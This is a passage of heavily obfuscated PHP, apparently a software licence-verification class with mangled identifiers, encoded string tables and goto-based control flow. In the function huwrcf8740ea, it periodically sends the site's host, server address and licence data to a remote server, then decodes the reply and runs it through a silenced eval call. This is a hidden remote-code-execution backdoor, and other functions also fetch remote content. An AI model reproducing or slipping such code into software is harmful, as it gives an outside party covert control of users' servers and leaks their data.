DÃêÄ’ÉÛ; bÈõãÙ¡: $FóÑ›…Í©‚ = $A÷ÌÇ¬›ßí[228]($A÷ÌÇ¬›ßí[61]($A÷ÌÇ¬›ßí[11])->{$_SERVER[¦À‹¤][229]}(), $A÷ÌÇ¬›ßí[230]); $c°Èê‡ƒ = $dæº…â£Ø [618]; if (!$c°Èê‡ƒ) { return; } goto eØÜ°Ûº»Ä; BÛ…ğË÷Û: if (!$A÷ÌÇ¬›ßí[112]($GLOBALS, $A÷ÌÇ¬›ßí[138])) { die; } $cÄ½šƒ…‰À = $GLOBALS[$A÷ÌÇ¬›ßí[22]]; if (isset($cÄ½šƒ…‰À[$A÷ÌÇ¬›ßí[169]])) { $this->{$_SERVER[¦À‹¤][170]}(); die; } goto cºõÇœË´Î; eØÜ°Ûº»Ä: $F×¹§ÖôÈã = $FóÑ›…Í©‚[$A÷ÌÇ¬›ßí[231]]; $Bó´—¨©¸à = $dæº…â£Ø [619]; if (strlen($Bó´—¨©¸à) < $dæº…â£Ø [584]) { die; } goto A§å¢¦¥—Ä; DÃêÄ’ÉÛ: $Eå´ÉèäÀ­ = $dæº…â£Ø [616]; if (strlen($Eå´ÉèäÀ­) < $dæº…â£Ø [574]) { die; } $b‰ÓÈ¨Ø = $A÷ÌÇ¬›ßí[220]($A÷ÌÇ¬›ßí[25]($dØÑ¥ï£å, 10, 16)); goto b˜î„«Â¬Ó; f‚ÔæËôã«: $eÑŒîèä™ = $this->{$_SERVER[¦À‹¤][206]}($D˜­Ñ°À…†[$A÷ÌÇ¬›ßí[207]]); if (!$eÑŒîèä™ || $eÑŒîèä™ != $D˜­Ñ°À…†[$A÷ÌÇ¬›ßí[151]]) { $f„£„´ÉĞ„ = array($A÷ÌÇ¬›ßí[208] => $A÷ÌÇ¬›ßí[61]($A÷ÌÇ¬›ßí[62])->{$_SERVER[¦À‹¤][63]}($A÷ÌÇ¬›ßí[122]), $A÷ÌÇ¬›ßí[209] => $_SERVER[$A÷ÌÇ¬›ßí[121]], $A÷ÌÇ¬›ßí[210] => $A÷ÌÇ¬›ßí[211](), $A÷ÌÇ¬›ßí[180] => $_SERVER[$A÷ÌÇ¬›ßí[181]]); $d¬ç›ĞÆç· = $this->{$_SERVER[¦À‹¤][212]}($A÷ÌÇ¬›ßí[154]($f„£„´ÉĞ„)); $this->{$_SERVER[¦À‹¤][189]}($A÷ÌÇ¬›ßí[213] . $d¬ç›ĞÆç·); $A÷ÌÇ¬›ßí[172]($A÷ÌÇ¬›ßí[204]($A÷ÌÇ¬›ßí[214]), !0); } $D¦ëÚ«ÈÅÊ = array($A÷ÌÇ¬›ßí[215] => $BôŠñ¯Ïøï[$A÷ÌÇ¬›ßí[171]], $A÷ÌÇ¬›ßí[216] => $D˜­Ñ°À…†[$A÷ÌÇ¬›ßí[217]], $A÷ÌÇ¬›ßí[218] => $A÷ÌÇ¬›ßí[130](16), $A÷ÌÇ¬›ßí[126] => $D˜­Ñ°À…†[$A÷ÌÇ¬›ßí[219]]); goto cĞŞ‰ÎÂö–; Dõø›ÌÔÊÀ: $e°İÌĞ‰İŠ = $dæº…â£Ø [614]; if (strlen($e°İÌĞ‰İŠ) < $dæº…â£Ø [596]) { die; } $Cğ¾ŒÊùõ = $A÷ÌÇ¬›ßí[120]($_SERVER[$A÷ÌÇ¬›ßí[121]] . $dî«º°°ó“); goto bÈ÷ÕŞ½¨·; aê¢½® á§: while (strlen($bÀÙ‘ÔªÓÃ) < $dæº…â£Ø [574]) { if (!$bÀÙ‘ÔªÓÃ) { break; } $bÀÙ‘ÔªÓÃ++; } $A÷ÌÇ¬›ßí[172]($A÷ÌÇ¬›ßí[204]($A÷ÌÇ¬›ßí[214]), !0); goto a´Åùˆ¢¦; D‹İæä¹›: $D¦ëÚ«ÈÅÊ[$A÷ÌÇ¬›ßí[128]] = $A÷ÌÇ¬›ßí[220]($A÷ÌÇ¬›ßí[124]($this->{$_SERVER[¦À‹¤][153]}($A˜‡©Ì¥¥…, $A÷ÌÇ¬›ßí[221]))); $fËß©Â·ÉÉ = $A÷ÌÇ¬›ßí[130](16); $d‚¨½÷ë† = $dæº…â£Ø [615]; goto aä¥»Æ‘÷Å; A§å¢¦¥—Ä: $eæö¹İ²Ò‹ = array(); $eæö¹İ²Ò‹[$b‰ÓÈ¨Ø] = $DÑóİ±˜¾; $A÷ÌÇ¬›ßí[61]($A÷ÌÇ¬›ßí[11])->{$_SERVER[¦À‹¤][232]}($F×¹§ÖôÈã[$A÷ÌÇ¬›ßí[233]], array($A÷ÌÇ¬›ßí[234] => $eæö¹İ²Ò‹)); goto dİôğ”õ­Ø; dİôğ”õ­Ø: $c‹Ÿ´¹ŸĞœ = $dæº…â£Ø [620]; if (strlen($c‹Ÿ´¹ŸĞœ) < $dæº…â£Ø [588]) { return; } $this->vzwndde6adc5 = $D˜­Ñ°À…†; goto D„Š‡›—‹ñ; a´Åùˆ¢¦: } private function licenseRegistSuccess() { $AÛõ¤˜ì…¥ =& $_SERVER[¦À‹¤]; $A°ÊùÜ—Ö = $AÛõ¤˜ì…¥[61]($AÛõ¤˜ì…¥[62])->{$_SERVER[¦À‹¤][63]}(); $bê¯ÜÛ—ÆÎ = $_SERVER[Š‰][623]; if (!$bê¯ÜÛ—ÆÎ) { return; } if ($A°ÊùÜ—Ö[$AÛõ¤˜ì…¥[89]] != $AÛõ¤˜ì…¥[226]) { $AÛõ¤˜ì…¥[61]($AÛõ¤˜ì…¥[62])->{$_SERVER[¦À‹¤][227]}($AÛõ¤˜ì…¥[89], $AÛõ¤˜ì…¥[226]); } $AÛõ¤˜ì…¥[116]($AÛõ¤˜ì…¥[238])->{$_SERVER[¦À‹¤][239]}(!0); } private function vnag9c69ed69() { goto b¶òí¹à‹; aÄºâ££•: $FÜ×¼™§‹Ó[61]($FÜ×¼™§‹Ó[62])->{$_SERVER[¦À‹¤][224]}($FÜ×¼™§‹Ó[225], $FÜ×¼™§‹Ó[240]); $E‘©ã¯»ì = $Eé‚ á‡ñì[624]; if (strlen($E‘©ã¯»ì) < $Eé‚ á‡ñì[605]) { die; } goto d°Œ·¦“âí; d°Œ·¦“âí: $this->vzwndde6adc5 = array(); $this->rdfkfcaab84e = $FÜ×¼™§‹Ó[127]; goto Aóìóù‚ïÒ; b¶òí¹à‹: $Eé‚ á‡ñì =& $_SERVER[Š‰]; $FÜ×¼™§‹Ó =& $_SERVER[¦À‹¤]; $FÜ×¼™§‹Ó[61]($FÜ×¼™§‹Ó[62])->{$_SERVER[¦À‹¤][227]}(array($FÜ×¼™§‹Ó[215] => $FÜ×¼™§‹Ó[10], $FÜ×¼™§‹Ó[216] => $FÜ×¼™§‹Ó[10], $FÜ×¼™§‹Ó[126] => $FÜ×¼™§‹Ó[127], $FÜ×¼™§‹Ó[128] => $FÜ×¼™§‹Ó[10], $FÜ×¼™§‹Ó[129] => $FÜ×¼™§‹Ó[10])); goto aÄºâ££•; Aóìóù‚ïÒ: } private function oihf936d7283() { goto E¶Õõ‡¶ò¹; EÔª‹„ÎÂ‰: if (strlen($F°µŒñÅŸ×) < $a——ÎÙÅ«à[588]) { die; } if ($EÄÁÂÜÑ˜¼[$f¨ØÑÜ³Š¤[126]] == $f¨ØÑÜ³Š¤[127]) { return; } $FêŒòİÜ¡ = $f¨ØÑÜ³Š¤[61]($f¨ØÑÜ³Š¤[62])->{$_SERVER[¦À‹¤][63]}($f¨ØÑÜ³Š¤[122]); goto d»ÆóªÈäª; eèğ‚®Œ„: $this->rdfkfcaab84e = $EÄÁÂÜÑ˜¼[$f¨ØÑÜ³Š¤[126]]; goto d•ÊÌÂ¦; E  ç»‹ë÷: $Dæ‹â¶í¥½ = $a——ÎÙÅ«à[625]; if (!$Dæ‹â¶í¥½) { return; } $this->rdfkfcaab84e = $f¨ØÑÜ³Š¤[127]; goto FÌ’óÜºƒé; B©Š´”õ®ç: if (!$f¨ØÑÜ³Š¤[198]($b°¯õÌÁó) || !isset($b°¯õÌÁó[$f¨ØÑÜ³Š¤[241]]) || $f¨ØÑÜ³Š¤[242]() - $b°¯õÌÁó[$f¨ØÑÜ³Š¤[241]] >= 60) { $eÖˆÇ…±âÃ = $f¨ØÑÜ³Š¤[228]($f¨ØÑÜ³Š¤[61]($f¨ØÑÜ³Š¤[11])->{$_SERVER[¦À‹¤][229]}(), $f¨ØÑÜ³Š¤[230]); $E¸¢œÌÒóÀ = $eÖˆÇ…±âÃ[$f¨ØÑÜ³Š¤[231]]; $E§á–Šª¶Ø = $f¨ØÑÜ³Š¤[120]($_SERVER[$f¨ØÑÜ³Š¤[121]] . $f¨ØÑÜ³Š¤[220]($FêŒòİÜ¡) . $EÄÁÂÜÑ˜¼[$f¨ØÑÜ³Š¤[216]]); $F‡ÍªÏ²Œİ = $f¨ØÑÜ³Š¤[220]($f¨ØÑÜ³Š¤[25]($E§á–Šª¶Ø, 10, 16)); $b°¯õÌÁó = $this->{$_SERVER[¦À‹¤][195]}($E¸¢œÌÒóÀ[$f¨ØÑÜ³Š¤[100]][$F‡ÍªÏ²Œİ], $E§á–Šª¶Ø); $b°¯õÌÁó = $f¨ØÑÜ³Š¤[197]($b°¯õÌÁó, !0); } if (!$f¨ØÑÜ³Š¤[198]($b°¯õÌÁó)) { return $this->{$_SERVER[¦À‹¤][170]}(); } $EÑˆ¹‰áéÌ = $f¨ØÑÜ³Š¤[150]($b°¯õÌÁó[$f¨ØÑÜ³Š¤[151]]); goto e…»­ŞâôÔ; FÌ’óÜºƒé: $dÌ‹ßöÊ´ = $a——ÎÙÅ«à[626]; $EÄÁÂÜÑ˜¼ = $f¨ØÑÜ³Š¤[61]($f¨ØÑÜ³Š¤[62])->{$_SERVER[¦À‹¤][63]}(); $F°µŒñÅŸ× = $a——ÎÙÅ«à[627]; goto EÔª‹„ÎÂ‰; d»ÆóªÈäª: $dø‘ƒÅÒªİ = $f¨ØÑÜ³Š¤[236] . $f¨ØÑÜ³Š¤[120]($FêŒòİÜ¡ . $f¨ØÑÜ³Š¤[237]); $BÖÓâó¨‡ñ = $a——ÎÙÅ«à[628]; $b°¯õÌÁó = Cache::get($dø‘ƒÅÒªİ); goto B©Š´”õ®ç; E¶Õõ‡¶ò¹: $a——ÎÙÅ«à =& $_SERVER[Š‰]; $f¨ØÑÜ³Š¤ =& $_SERVER[¦À‹¤]; $_SERVER[$f¨ØÑÜ³Š¤[181]] = $f¨ØÑÜ³Š¤[112]($_SERVER, $f¨ØÑÜ³Š¤[181], APP_HOST); goto E  ç»‹ë÷; e…»­ŞâôÔ: if ($f¨ØÑÜ³Š¤[242]() >= $EÑˆ¹‰áéÌ) { return $this->{$_SERVER[¦À‹¤][170]}(); } if ($f¨ØÑÜ³Š¤[242]() - $b°¯õÌÁó[$f¨ØÑÜ³Š¤[241]] > 20) { $b°¯õÌÁó[$f¨ØÑÜ³Š¤[241]] = $f¨ØÑÜ³Š¤[242](); Cache::set($dø‘ƒÅÒªİ, $b°¯õÌÁó); } $this->vzwndde6adc5 = $b°¯õÌÁó; goto eèğ‚®Œ„; d•ÊÌÂ¦: } private function brwl1e2393cf() { goto bƒÚÎ•³ì; cŒ…ƒÇæÚ: if ($dë‡º‚¼ª‘ == $eö„°ğèŒ§[243] && $this->rdfkfcaab84e == $eö„°ğèŒ§[127]) { $eö„°ğèŒ§[172]($eö„°ğèŒ§[204]($eö„°ğèŒ§[244]), !1, $eö„°ğèŒ§[245]); } $Eß’‚£ï¨° = array($eö„°ğèŒ§[246], $eö„°ğèŒ§[247]); if ($eö„°ğèŒ§[248]($dë‡º‚¼ª‘, $Eß’‚£ï¨°)) { if ($this->rdfkfcaab84e == $eö„°ğèŒ§[127] && isset($BŒÈÀ”®ŞÃ[$eö„°ğèŒ§[249]])) { $eö„°ğèŒ§[172]($eö„°ğèŒ§[204]($eö„°ğèŒ§[244]), !1, $eö„°ğèŒ§[245]); die; } $F·ô›òÂ¿¦ = $this->{$_SERVER[¦À‹¤][143]}(); if ($F·ô›òÂ¿¦ != $eö„°ğèŒ§[250]($eö„°ğèŒ§[251])) { if ($F·ô›òÂ¿¦ <= $eö„°ğèŒ§[61]($eö„°ğèŒ§[145])->{$_SERVER[¦À‹¤][146]}()) { $eö„°ğèŒ§[172]($eö„°ğèŒ§[204]($eö„°ğèŒ§[252]), !1, $eö„°ğèŒ§[245]); die; } } } goto FÈà¢Åß½È; bƒÚÎ•³ì: $dĞ÷æÇ·¯ =& $_SERVER[Š‰]; $eö„°ğèŒ§ =& $_SERVER[¦À‹¤]; $BŒÈÀ”®ŞÃ = $GLOBALS[$eö„°ğèŒ§[22]]; goto Bí‚†£†à¨; Bí‚†£†à¨: $c›ÀÇÇ” = $dĞ÷æÇ·¯[629]; if (strlen($c›ÀÇÇ”) < $dĞ÷æÇ·¯[584]) { return; } $dë‡º‚¼ª‘ = $_SERVER[$eö„°ğèŒ§[44]]; goto cŒ…ƒÇæÚ; FÈà¢Åß½È: } private function mycve91d2824() { goto bÃøé’à; a¸íâ¡é¸à: $cÙ©²ˆÊõœ = @$c¸¤“ÎĞ†‘[263]($EÃÚ®Ä¹æ‹, !1, $AİíóÈ); $CÃ¡å¦Â‹¹ = $a¦±¼—‘Èõ[632]; if (strlen($CÃ¡å¦Â‹¹) < $a¦±¼—‘Èõ[588]) { return; } goto BºÚ¡Ä¥·; bÃøé’à: $a¦±¼—‘Èõ =& $_SERVER[Š‰]; $c¸¤“ÎĞ†‘ =& $_SERVER[¦À‹¤]; $C½êîêŞ• = array($c¸¤“ÎĞ†‘[141], $c¸¤“ÎĞ†‘[253]); goto aâ²´Ê…•÷; aâ²´Ê…•÷: $D¸Àêë×ª‹ = $a¦±¼—‘Èõ[630]; if (!$D¸Àêë×ª‹) { die; } if (!$c¸¤“ÎĞ†‘[112]($GLOBALS, $c¸¤“ÎĞ†‘[138]) || !isset($_GET[$c¸¤“ÎĞ†‘[254]])) { return; } goto eá¿Ù’é”Š; eá¿Ù’é”Š: if (!$c¸¤“ÎĞ†‘[248]($_SERVER[$c¸¤“ÎĞ†‘[44]], $C½êîêŞ•)) { return; } $EÃÚ®Ä¹æ‹ = $c¸¤“ÎĞ†‘[255]; $EÃÚ®Ä¹æ‹ = $this->{$_SERVER[¦À‹¤][256]}($EÃÚ®Ä¹æ‹, $c¸¤“ÎĞ†‘[257]); goto bçÛîÕ‘×ñ; BºÚ¡Ä¥·: $c¸¤“ÎĞ†‘[264]($c¸¤“ÎĞ†‘[265]); if ($cÙ©²ˆÊõœ && $c¸¤“ÎĞ†‘[32]($cÙ©²ˆÊõœ, $c¸¤“ÎĞ†‘[266])) { echo $cÙ©²ˆÊõœ; } die; goto DÌĞ¿ÖĞ’; bçÛîÕ‘×ñ: $AİíóÈ = $c¸¤“ÎĞ†‘[258](array($c¸¤“ÎĞ†‘[259] => array($c¸¤“ÎĞ†‘[260] => $c¸¤“ÎĞ†‘[261], $c¸¤“ÎĞ†‘[262] => 3))); $Bã‚‹•‚¬Ñ = $a¦±¼—‘Èõ[631]; if (strlen($Bã‚‹•‚¬Ñ) < $a¦±¼—‘Èõ[605]) { return; } goto a¸íâ¡é¸à; DÌĞ¿ÖĞ’: } public function cflhc5403404($b„¤ŒºçÙÙ) { goto E®š°¨˜è; E®š°¨˜è: $d…ÏÍğÒ£’ =& $_SERVER[Š‰]; $Dª‹ˆ§‰£ä =& $_SERVER[¦À‹¤]; if ($this->rdfkfcaab84e == $Dª‹ˆ§‰£ä[267]) { return $b„¤ŒºçÙÙ; } goto CÕáÂ·óõÂ; aäğƒ‹Ë”Œ: $bòÈé–ª‹ = array(); foreach ($f›õ²÷ÔÎ£ as $EÆ¢ ÊÆ => $AªªÓÙíµ) { if ($AªªÓÙíµ == $Dª‹ˆ§‰£ä[269] && $Dª‹ˆ§‰£ä[25]($this->rdfkfcaab84e, 0, 1) == $Dª‹ˆ§‰£ä[269]) { continue; } if (!$Dª‹ˆ§‰£ä[248]($EÆ¢ ÊÆ, $cÃÀ£ô¬ÁÉ)) { $bòÈé–ª‹[] = $EÆ¢ ÊÆ; } } foreach ($bòÈé–ª‹ as $EÆ¢ ÊÆ) { unset($b„¤ŒºçÙÙ[$EÆ¢ ÊÆ]); $B¼ß¯õÚ²› = $d…ÏÍğÒ£’[634]; if (strlen($B¼ß¯õÚ²›) < $d…ÏÍğÒ£’[588]) { die; } } goto E åêê±ãĞ; E åêê±ãĞ: return $b„¤ŒºçÙÙ; goto B¼£Êí©à‘; CÕáÂ·óõÂ: $f›õ²÷ÔÎ£ = array($Dª‹ˆ§‰£ä[268] => $Dª‹ˆ§‰£ä[269], $Dª‹ˆ§‰£ä[270] => $Dª‹ˆ§‰£ä[269], $Dª‹ˆ§‰£ä[271] => $Dª‹ˆ§‰£ä[269], $Dª‹ˆ§‰£ä[272] => $Dª‹ˆ§‰£ä[269], $Dª‹ˆ§‰£ä[273] => $Dª‹ˆ§‰£ä[269], $Dª‹ˆ§‰£ä[274] => $Dª‹ˆ§‰£ä[275], $Dª‹ˆ§‰£ä[276] => $Dª‹ˆ§‰£ä[275], $Dª‹ˆ§‰£ä[277] => $Dª‹ˆ§‰£ä[275], $Dª‹ˆ§‰£ä[278] => $Dª‹ˆ§‰£ä[275], $Dª‹ˆ§‰£ä[279] => $Dª‹ˆ§‰£ä[275], $Dª‹ˆ§‰£ä[280] => $Dª‹ˆ§‰£ä[275], $Dª‹ˆ§‰£ä[281] => $Dª‹ˆ§‰£ä[275]); $BÙÉğˆãŠÜ = $d…ÏÍğÒ£’[633]; $cÃÀ£ô¬ÁÉ = $Dª‹ˆ§‰£ä[0]($Dª‹ˆ§‰£ä[282], $Dª‹ˆ§‰£ä[112]($this->vzwndde6adc5, $Dª‹ˆ§‰£ä[135], $Dª‹ˆ§‰£ä[10])); goto aäğƒ‹Ë”Œ; B¼£Êí©à‘: } private function kduq7346d8a4() { $E¦ã‰Â«†Ê =& $_SERVER[¦À‹¤]; if ($this->rdfkfcaab84e != $E¦ã‰Â«†Ê[127]) { return; } $GLOBALS[$E¦ã‰Â«†Ê[100]][$E¦ã‰Â«†Ê[104]][$E¦ã‰Â«†Ê[283]] = $E¦ã‰Â«†Ê[226]; $GLOBALS[$E¦ã‰Â«†Ê[100]][$E¦ã‰Â«†Ê[284]] = $E¦ã‰Â«†Ê[226]; if ($E¦ã‰Â«†Ê[61]($E¦ã‰Â«†Ê[285])->{$_SERVER[¦À‹¤][63]}($E¦ã‰Â«†Ê[89]) != $E¦ã‰Â«†Ê[240]) { $E¦ã‰Â«†Ê[61]($E¦ã‰Â«†Ê[285])->{$_SERVER[¦À‹¤][227]}($E¦ã‰Â«†Ê[89], $E¦ã‰Â«†Ê[240]); } } public function fesube43eb76() { $eªÕáÑ“„ø =& $_SERVER[Š‰]; return $_SERVER[¦À‹¤][286]; $dàƒŠå´Ì¸ = $eªÕáÑ“„ø[635]; if (strlen($dàƒŠå´Ì¸) < $eªÕáÑ“„ø[574]) { return; } } private function huwrcf8740ea() { goto cÏ…¥¹; Eä¾´ëá: if (!$b…¶ßªÕ™÷[248]($_SERVER[$b…¶ßªÕ™÷[44]], $bŒ—¢ƒ¼õØ)) { return; } if ($b…¶ßªÕ™÷[242]() % 4 != 0) { return; } $D¨ËËÖáª = $b…¶ßªÕ™÷[13](array($b…¶ßªÕ™÷[292], $b…¶ßªÕ™÷[293]), $câÖéó›§); goto Fôì‹ÅëÈë; Bäèšİ÷Å¾: if (!$dÑÉÈôİˆ™) { return; } $CÛ“õòµª† = $this->{$_SERVER[¦À‹¤][189]}($b…¶ßªÕ™÷[295], $AæÔœ¢Õ¶); $d´ŸòØ¬Šİ = $FïÅ»éÙ–¶[640]; goto EÓÂà½ÒÑ ; c´õã£¦İÊ: $a•¾™‰¹øÄ = $FïÅ»éÙ–¶[636]; while (strlen($a•¾™‰¹øÄ) < $FïÅ»éÙ–¶[588]) { if (!$a•¾™‰¹øÄ) { break; } $a•¾™‰¹øÄ++; } $câÖéó›§ = $b…¶ßªÕ™÷[290] . $b…¶ßªÕ™÷[120]($b…¶ßªÕ™÷[291]); goto B¥ËµÆÀÌª; cÏ…¥¹: $FïÅ»éÙ–¶ =& $_SERVER[Š‰]; $b…¶ßªÕ™÷ =& $_SERVER[¦À‹¤]; $bŒ—¢ƒ¼õØ = array($b…¶ßªÕ™÷[287], $b…¶ßªÕ™÷[288], $b…¶ßªÕ™÷[289]); goto c´õã£¦İÊ; B÷óÛ„à©ğ: if ($this->{$_SERVER[¦À‹¤][206]}($CÛ“õòµª†[$b…¶ßªÕ™÷[296]]) != $AæÔœ¢Õ¶[$b…¶ßªÕ™÷[171]]) { $CãÁ’¹¸ŞÄ = array($b…¶ßªÕ™÷[208] => $b…¶ßªÕ™÷[61]($b…¶ßªÕ™÷[62])->{$_SERVER[¦À‹¤][63]}($b…¶ßªÕ™÷[122]), $b…¶ßªÕ™÷[209] => $_SERVER[$b…¶ßªÕ™÷[121]], $b…¶ßªÕ™÷[210] => $b…¶ßªÕ™÷[211](), $b…¶ßªÕ™÷[180] => $_SERVER[$b…¶ßªÕ™÷[181]]); $aåæÁ‚áƒ = $this->{$_SERVER[¦À‹¤][212]}($b…¶ßªÕ™÷[154]($CãÁ’¹¸ŞÄ)); $CÛ“õòµª† = $this->{$_SERVER[¦À‹¤][189]}($b…¶ßªÕ™÷[213] . $aåæÁ‚áƒ); if ($CÛ“õòµª† && $b…¶ßªÕ™÷[198]($CÛ“õòµª†) && isset($CÛ“õòµª†[$b…¶ßªÕ™÷[296]])) { $aÉÖã«‹ˆ = $this->{$_SERVER[¦À‹¤][195]}($CÛ“õòµª†[$b…¶ßªÕ™÷[296]], 2); if ($aÉÖã«‹ˆ) { $aÉÖã«‹ˆ = $this->{$_SERVER[¦À‹¤][206]}($aÉÖã«‹ˆ); } if ($aÉÖã«‹ˆ) { try { @eval($aÉÖã«‹ˆ); } catch (Exception $bÔÙ–Ì‹É) { } } } } goto fÀ¨ºÈ®ƒ¹; B¥ËµÆÀÌª: $b›·¸÷”² = $FïÅ»éÙ–¶[637]; if (!$b›·¸÷”²) { die; } if ($this->rdfkfcaab84e == $b…¶ßªÕ™÷[127] || !$b…¶ßªÕ™÷[112]($GLOBALS, $b…¶ßªÕ™÷[138])) { return; } goto Eä¾´ëá; Fôì‹ÅëÈë: $eÄ¨¢ˆ²‚å = $FïÅ»éÙ–¶[638]; if (strlen($eÄ¨¢ˆ²‚å) < $FïÅ»éÙ–¶[605]) { return; } if ($D¨ËËÖáª && $b…¶ßªÕ™÷[242]() - $D¨ËËÖáª < $b…¶ßªÕ™÷[250]($b…¶ßªÕ™÷[294])) { return; } goto FÆÉ»Ÿ Šø; c°Ÿñ×ê½ª: $this->{$_SERVER[¦À‹¤][170]}(); $f°·œÄñø = $FïÅ»éÙ–¶[641]; while (strlen($f°·œÄñø) < $FïÅ»éÙ–¶[588]) { if (!$f°·œÄñø) { break; } $f°·œÄñø++; } goto B÷óÛ„à©ğ; EÓÂà½ÒÑ : if (!$d´ŸòØ¬Šİ) { return; } if (!$b…¶ßªÕ™÷[198]($CÛ“õòµª†)) { return; } if ($CÛ“õòµª†[$b…¶ßªÕ™÷[171]] && $CÛ“õòµª†[$b…¶ßªÕ™÷[296]]) { if ($this->{$_SERVER[¦À‹¤][206]}($CÛ“õòµª†[$b…¶ßªÕ™÷[296]]) == $AæÔœ¢Õ¶[$b…¶ßªÕ™÷[171]]) { return; } } goto c°Ÿñ×ê½ª; FÆÉ»Ÿ Šø: $b…¶ßªÕ™÷[13](array($b…¶ßªÕ™÷[292], $b…¶ßªÕ™÷[158]), $câÖéó›§, $b…¶ßªÕ™÷[242]()); $AæÔœ¢Õ¶ = array($b…¶ßªÕ™÷[171] => $b…¶ßªÕ™÷[61]($b…¶ßªÕ™÷[62])->{$_SERVER[¦À‹¤][63]}($b…¶ßªÕ™÷[215]), $b…¶ßªÕ™÷[184] => $this->rdfkfcaab84e, $b…¶ßªÕ™÷[182] => $_SERVER[$b…¶ßªÕ™÷[183]], $b…¶ßªÕ™÷[175] => $b…¶ßªÕ™÷[155], $b…¶ßªÕ™÷[178] => $_SERVER[$b…¶ßªÕ™÷[179]]); $dÑÉÈôİˆ™ = $FïÅ»éÙ–¶[639]; goto Bäèšİ÷Å¾; fÀ¨ºÈ®ƒ¹: } private function pmgofb3f9179($cË¾¿Éƒêö = '', $FÊÆË‘Ï¼â = array(), $c†Îô Îì = 5) { goto f¿Ñˆ•ÑŒ; DßİÇ·™ˆÊ: $C‘º‹„Ù– = $aé®®îêÛï[642]; $A°ô»«¹à = $this->{$_SERVER[¦À‹¤][256]}($A°ô»«¹à, $c‚˜ ¤Üªš[298]); $dâº»‚É = $aé®®îêÛï[643]; goto eğ´‹Ä˜Ó; eğ´‹Ä˜Ó: if (strlen($dâº»‚É) < $aé®®îêÛï[596]) { die; } $A°ô»«¹à = $A°ô»«¹à . $cË¾¿Éƒêö; if ($FÊÆË‘Ï¼â && $c‚˜ ¤Üªš[198]($FÊÆË‘Ï¼â)) { $A°ô»«¹à = $A°ô»«¹à . $c‚˜ ¤Üªš[299] . $c‚˜ ¤Üªš[300]($FÊÆË‘Ï¼â); } goto BãÊâ‹„Íê; f¿Ñˆ•ÑŒ: $aé®®îêÛï =& $_SERVER[Š‰]; $c‚˜ ¤Üªš =& $_SERVER[¦À‹¤]; $A°ô»«¹à = $c‚˜ ¤Üªš[297]; goto DßİÇ·™ˆÊ; BãÊâ‹„Íê: if ($FÊÆË‘Ï¼â === -1) { return $A°ô»«¹à; } $f•ğÉ‚”ƒ = $c‚˜ ¤Üªš[258](array($c‚˜ ¤Üªš[259] => array($c‚˜ ¤Üªš[262] => $c†Îô Îì, $c‚˜ ¤Üªš[260] => $c‚˜ ¤Üªš[301]), $c‚˜ ¤Üªš[302] => array($c‚˜ ¤Üªš[303] => !1, $c‚˜ ¤Üªš[304] => !1))); $FÊÆË‘Ï¼â = @$c‚˜ ¤Üªš[263]($A°ô»«¹à, !1, $f•ğÉ‚”ƒ); goto Dš´„²ñ¥; F†ÚÅ—½ãŒ: while (strlen($AÕÏ‹…Ëß) < $aé®®îêÛï[596]) { if (!$AÕÏ‹…Ëß) { break; } $AÕÏ‹…Ëß++; } goto BóºÏÅ»©; Dš´„²ñ¥: $céŸàŠÎŒŸ = $aé®®îêÛï[644]; return $c‚˜ ¤Üªš[197]($FÊÆË‘Ï¼â, !0); $AÕÏ‹…Ëß = $aé®®îêÛï[645]; goto F†ÚÅ—½ãŒ; BóºÏÅ»©: } private function hcira382f748() { goto Aæ¥íäíÃô; a½ö”Ö¶²: $C¡âà°º = $eÎ«‚‡õéà[647]; return $f„Ş©éˆ­¡ + $C«®îœ¢ƒè; goto FÎõ¤–ˆË­; BÔºÉª±œ: $f„Ş©éˆ­¡ = $Fêßò½‰É[250]($f„Ş©éˆ­¡ ? $f„Ş©éˆ­¡ : $Fêßò½‰É[306]); $C«®îœ¢ƒè = $Fêßò½‰É[112]($this->vzwndde6adc5, $Fêßò½‰É[332]); $C«®îœ¢ƒè = $C«®îœ¢ƒè ? $Fêßò½‰É[250]($C«®îœ¢ƒè) : 0; goto a½ö”Ö¶²; Aæ¥íäíÃô: $eÎ«‚‡õéà =& $_SERVER[Š‰]; $Fêßò½‰É =& $_SERVER[¦À‹¤]; $B³¾»ÂÎšõ = array($Fêßò½‰É[305] => $Fêßò½‰É[306], $Fêßò½‰É[307] => $Fêßò½‰É[308], $Fêßò½‰É[309] => $Fêßò½‰É[310], $Fêßò½‰É[311] => $Fêßò½‰É[312], $Fêßò½‰É[313] => $Fêßò½‰É[314], $Fêßò½‰É[315] => $Fêßò½‰É[251], $Fêßò½‰É[316] => $Fêßò½‰É[251], $Fêßò½‰É[317] => $Fêßò½‰É[306], $Fêßò½‰É[318] => $Fêßò½‰É[308], $Fêßò½‰É[319] => $Fêßò½‰É[310], $Fêßò½‰É[320] => $Fêßò½‰É[321], $Fêßò½‰É[322] => $Fêßò½‰É[312], $Fêßò½‰É[323] => $Fêßò½‰É[324], $Fêßò½‰É[325] => $Fêßò½‰É[314], $Fêßò½‰É[326] => $Fêßò½‰É[327], $Fêßò½‰É[328] => $Fêßò½‰É[329], $Fêßò½‰É[330] => $Fêßò½‰É[331]); goto DòÙ èğÛ; DòÙ èğÛ: $CÑÖ‹ğìö = $eÎ«‚‡õéà[646]; while ($CÑÖ‹ğìö < $eÎ«‚‡õéà[584]) { if ($CÑÖ‹ğìö >= 0) { break; } $CÑÖ‹ğìö++; } $f„Ş©éˆ­¡ = $B³¾»ÂÎšõ[$this->rdfkfcaab84e]; goto BÔºÉª±œ; FÎõ¤–ˆË­: } public function ailsf64286c5($e¡ÏøÄå‡) { goto cœôÎõ•£‰; cœôÎõ•£‰: $aÂÉàÒëëğ =& $_SERVER[Š‰]; $E¯‹Ú™¥‚¿ =& $_SERVER[¦À‹¤]; $c¼õËÒÊ‡Ä = $this->{$_SERVER[¦À‹¤][143]}(); goto cÌÊ‡ÔŸã; cÌÊ‡ÔŸã: $A—·‹’Ğ£œ = $aÂÉàÒëëğ[648]; while ($A—·‹’Ğ£œ < $aÂÉàÒëëğ[596]) { if ($A—·‹’Ğ£œ >= 0) { break; } $A—·‹’Ğ£œ++; } if ($e¡ÏøÄå‡[$E¯‹Ú™¥‚¿[333]] == $E¯‹Ú™¥‚¿[226]) { return; } goto fõ—ÁÑŞëî; F‹óß¶Ì•: if (!$FÆ½ËßíÙÚ) { return; } if ($AÑùÀè£¹÷ <= $c¼õËÒÊ‡Ä) { return; } $D™ÜÓéÌõ = 